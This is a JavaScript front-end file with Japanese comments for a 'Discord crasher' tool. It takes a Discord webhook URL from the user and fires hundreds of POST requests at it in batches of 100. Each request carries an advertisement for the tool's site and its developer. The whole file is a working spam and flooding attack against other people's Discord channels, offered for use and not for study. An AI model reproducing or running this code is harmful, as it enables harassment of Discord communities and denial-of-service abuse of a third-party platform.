document.addEventListener('DOMContentLoaded', () => {
  const webhookInput = document.getElementById('webhookUrl');
  const statusMessage = document.getElementById('statusMessage');
  const buttons = document.querySelectorAll('.request-btn');

  // ボタンイベント
  buttons.forEach((button) => {
    button.addEventListener('click', async () => {
      const webhookUrl = webhookInput.value.trim();
      if (!webhookUrl) {
        alert('Webhook URLを入力してください。');
        return;
      }

      const requests = parseInt(button.getAttribute('data-requests'), 10);

      const batchSize = 100;
      const batches = Math.ceil(requests / batchSize);

      for (let batch = 0; batch < batches; batch++) {
        const promises = [];
        for (let i = 0; i < batchSize && batch * batchSize + i < requests; i++) {
          promises.push(sendWebhook(webhookUrl));
        }

        await Promise.allSettled(promises).then((results) => {
          results.forEach((result) => {
            if (result.status === 'fulfilled') {
              showStatusMessage('成功しました', 'success'); // 追加
            } else {
              showStatusMessage('失敗しました', 'error'); // 追加
            }
          });
        });
      }
    });
  });

  // Webhook送信関数
  async function sendWebhook(webhookUrl) {
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: 'https://discord-crasher.vercel.app | Developed by n4n45h1' }),
    });

    if (!response.ok) {
      throw new Error('Webhook送信失敗');
    }
  }

  // ステータス表示関数 追加
  function showStatusMessage(message, type) {
    statusMessage.textContent = message;
    statusMessage.className = `status-message ${type}`;
    setTimeout(() => {
      statusMessage.textContent = '';
      statusMessage.className = 'status-message';
    }, 5000);
  }
});
